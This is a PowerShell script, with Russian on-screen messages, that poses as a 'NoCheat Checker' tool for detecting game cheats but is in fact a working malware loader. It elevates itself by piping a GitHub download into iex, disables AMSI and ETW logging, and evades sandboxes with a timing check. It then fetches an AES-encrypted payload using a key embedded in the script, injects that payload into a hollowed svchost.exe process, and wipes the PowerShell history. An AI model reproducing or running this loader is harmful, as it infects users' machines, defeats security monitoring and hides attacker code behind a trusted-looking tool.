$ErrorActionPreference = "Stop"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
function Clear-PSHistory {
    Clear-History -ErrorAction SilentlyContinue
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) { Clear-Content -Path $historyPath -ErrorAction SilentlyContinue }
    } catch {}
}
if (-not $isAdmin) {
    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
    Clear-PSHistory
    exit
}
Write-Host "==========================================" -ForegroundColor Yellow
Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
Write-Host "==========================================" -ForegroundColor Yellow
try {
    $a=[psobject].Assembly.GetType("System.Management.Automation.AmsiUtils")
    if($a){$f=$a.GetField("amsiInitFailed",[Reflection.BindingFlags]"NonPublic,Static");if($f){$f.SetValue($null,$true)}}
} catch {}
try {
    $e=[psobject].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
    if($e){$ef=$e.GetField("etwProvider",[Reflection.BindingFlags]"NonPublic,Static");if($ef){$p=$ef.GetValue($null);if($p){$m=$p.GetType().GetField("m_enabled",[Reflection.BindingFlags]"NonPublic,Instance");if($m){$m.SetValue($p,0)}}}}
} catch {}
$t_start=Get-Date;Start-Sleep -Milliseconds 150;if(((Get-Date)-$t_start).TotalMilliseconds -lt 100){return}
$keyB64="gu2koIlU7CZc/688IiTjF7zHemZgBINLWrnhn2LBpk4="
$ivB64="ZIdLvAC84tJ3L5hxoOLCGw=="
$encUrl="https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat.checker.enc.b64"
try {
    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
    $wc=New-Object System.Net.WebClient
    $encB64=$wc.DownloadString($encUrl)
    $aes=[System.Security.Cryptography.Aes]::Create()
    $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key=[Convert]::FromBase64String($keyB64)
    $aes.IV=[Convert]::FromBase64String($ivB64)
    $encBytes=[Convert]::FromBase64String($encB64)
    $decBytes=$aes.CreateDecryptor().TransformFinalBlock($encBytes,0,$encBytes.Length)
    $ms=New-Object System.IO.MemoryStream(,$decBytes)
    $ds=New-Object System.IO.Compression.DeflateStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
    $msOut=New-Object System.IO.MemoryStream
    $ds.CopyTo($msOut)
    $payloadBytes=$msOut.ToArray()
    $code=@'
using System;
using System.Runtime.InteropServices;
public class PE {
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
 [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,uint s,uint p,out uint o);
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr b,IntPtr c,uint d,out uint e);
 [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h,uint m);
 [DllImport("kernel32.dll",SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr h,IntPtr b,byte[] buf,uint s,out UIntPtr w);
 [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
}
'@
    Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
    $code2=@'
using System;
using System.Runtime.InteropServices;
public class RunPE {
 [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)] public static extern bool CreateProcessA(string a,string b,IntPtr c,IntPtr d,bool e,uint f,IntPtr g,string h,ref STARTUPINFO i,out PROCESS_INFORMATION j);
 [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h,IntPtr b);
 [DllImport("kernel32.dll")] public static extern bool GetThreadContext(IntPtr h,IntPtr c);
 [DllImport("kernel32.dll")] public static extern bool SetThreadContext(IntPtr h,IntPtr c);
 [DllImport("kernel32.dll")] public static extern bool ResumeThread(IntPtr h);
 [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)] public struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
 [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
}
'@
    Add-Type -TypeDefinition $code2 -ErrorAction SilentlyContinue
    $si=New-Object RunPE+STARTUPINFO
    $si.cb=[Runtime.InteropServices.Marshal]::SizeOf($si)
    $pi=New-Object RunPE+PROCESS_INFORMATION
    $path=$env:SystemRoot+"\System32\svchost.exe"
    $created=[RunPE]::CreateProcessA($path,$null,[IntPtr]::Zero,[IntPtr]::Zero,$false,4,[IntPtr]::Zero,$null,[ref]$si,[ref]$pi)
    if(-not $created){throw "CreateProcess failed"}
    $base=[PE]::VirtualAlloc([IntPtr]::Zero,[uint32]$payloadBytes.Length,0x3000,0x40)
    $written=[UIntPtr]::Zero
    [PE]::WriteProcessMemory($pi.hProcess,$base,$payloadBytes,[uint32]$payloadBytes.Length,[ref]$written) | Out-Null
    [RunPE]::NtUnmapViewOfSection($pi.hProcess,[IntPtr]0x400000) | Out-Null
    [PE]::WriteProcessMemory($pi.hProcess,[IntPtr]0x400000,$payloadBytes,[uint32]$payloadBytes.Length,[ref]$written) | Out-Null
    [RunPE]::ResumeThread($pi.hThread) | Out-Null
    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
}
Clear-PSHistory
exit
